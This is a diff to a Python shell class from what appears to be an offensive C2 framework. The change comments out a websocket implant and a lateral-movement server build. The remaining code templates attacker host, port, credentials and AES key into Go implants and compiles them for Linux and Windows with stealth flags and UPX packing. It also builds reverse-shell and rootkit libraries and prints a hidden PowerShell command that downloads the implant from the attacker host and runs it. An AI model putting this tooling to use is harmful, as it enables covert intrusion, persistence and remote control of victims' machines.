@@ -10587,15 +10587,15 @@ class LazyOwnShell(cmd2.Cmd):
         file_evil = f"{path}/modules/evilhttprev.sh"
         filer = f"{path}/modules/r.sh"
         gofile = f"{path}/sessions/implant/implant_crypt.go"
-        gofile_ws = f"{path}/sessions/implant/implant_websocket.go"
+        #gofile_ws = f"{path}/sessions/implant/implant_rust.rs"
         payload_sh = f"{path}/sessions/lin/payload.sh"
         gofile2 = f"{path}/sessions/implant/listener.go"
-        gofile3 = f"{path}/sessions/implant/server.go"
+        #gofile3 = f"{path}/sessions/implant/server.go"
         gofile4 = f"{path}/sessions/implant/monrevlin.go"
-        server_go = f"{path}/sessions/server.go"
+        #server_go = f"{path}/sessions/server.go"
         monrevlin = f"{path}/sessions/monrevlin.go"
         implantgo = f"{path}/sessions/{line}"
-        implantgo_ws = f"{path}/sessions/ws_{line}"
+        #implantgo_ws = f"{path}/sessions/ws_{line}"
         implantgo2 = f"{path}/sessions/l_{line}"
         implant_config_json = f"{path}/sessions/implant_config_{line}.json"
         maleable = self.params["c2_maleable_route"]
@@ -10761,8 +10761,8 @@ class LazyOwnShell(cmd2.Cmd):
         contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/r.sh", 'w+') as f:
             f.write(contentr)
-        with open(gofile_ws, 'r') as f:
-            content_ws = f.read()
+        #with open(gofile_ws, 'r') as f:
+        #    content_ws = f.read()
             
         with open(gofile, 'r') as f:
             content = f.read()
@@ -10770,8 +10770,8 @@ class LazyOwnShell(cmd2.Cmd):
         with open(gofile2, 'r') as f:
             lcontent = f.read()
 
-        with open(gofile3, 'r') as f:
-            lateral_content = f.read()
+        #with open(gofile3, 'r') as f:
+        #    lateral_content = f.read()
 
         with open(gofile4, 'r') as f:
             monrevlin_content = f.read()
@@ -10779,41 +10779,41 @@ class LazyOwnShell(cmd2.Cmd):
         AES_KEY_hex = AES_KEY.hex()
         
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth).replace('{user_agent_1}', user_agent_1).replace('{user_agent_2}', user_agent_2).replace('{user_agent_3}', user_agent_3).replace('{url_trafic_1}', url_trafic_1).replace('{url_trafic_2}', url_trafic_2).replace('{url_trafic_3}', url_trafic_3)
-        content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
+        #content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
         
         monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
-        lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
+        #lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
         lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
         implant_go = implantgo + ".go"
         implant_go2 = implantgo + "_l.go"
-        implant_go_ws = implantgo_ws + ".go"
+        #implant_go_ws = implantgo_ws + ".go"
         if platform == "windows":
             implantgo += ".exe"
             implantgo2 += "_l.exe"
-            implantgo_ws += ".exe"
+            #implantgo_ws += ".exe"
             
         with open(implant_go, 'w+') as f:
             f.write(content)
             
-        with open(implant_go_ws, 'w+') as f:
-            f.write(content_ws)    
+        #with open(implant_go_ws, 'w+') as f:
+        #    f.write(content_ws)    
                 
         with open(f"{implant_go2}", 'w+') as f:
             f.write(lcontent)
 
-        with open(f"{server_go}", 'w+') as f:
-            f.write(lateral_content)
+        #with open(f"{server_go}", 'w+') as f:
+        #    f.write(lateral_content)
 
         with open(f"{monrevlin}", 'w+') as f:
             f.write(monrevlin_content)    
-        cmd = "cd sessions ; rm go.mod ; go mod init implant ; go get github.com/gorilla/websocket ; go get github.com/creack/pty"
+        cmd = "cd sessions ; rm go.mod ; go mod init implant"
         self.cmd(cmd)
         if platform == "linux":
             binary = line
             compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
+            #compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
             compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
             command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
             command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
@@ -10822,9 +10822,9 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command_mon)
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
+            #self.cmd(compile_command3)
             self.cmd(compile_command4)
-            self.cmd(compile_command_ws)
+            #self.cmd(compile_command_ws)
             
             self.cmd(cplib)
             self.onecmd(f"service {line}")
@@ -10860,9 +10860,9 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(icon_command)
 
             compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go}"
-            compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
+            #compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
             compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            #compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
             command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
@@ -10873,8 +10873,8 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(command_mrhyde)
             self.cmd(compile_command)
             self.cmd(compile_command2)
-            self.cmd(compile_command3)
-            self.cmd(compile_command_ws_win)
+            #self.cmd(compile_command3)
+            #self.cmd(compile_command_ws_win)
             upx = f"upx {self.sessions_dir}/{binary}"
             self.cmd(upx)
             upx = f"upx {self.sessions_dir}/b{binary}"
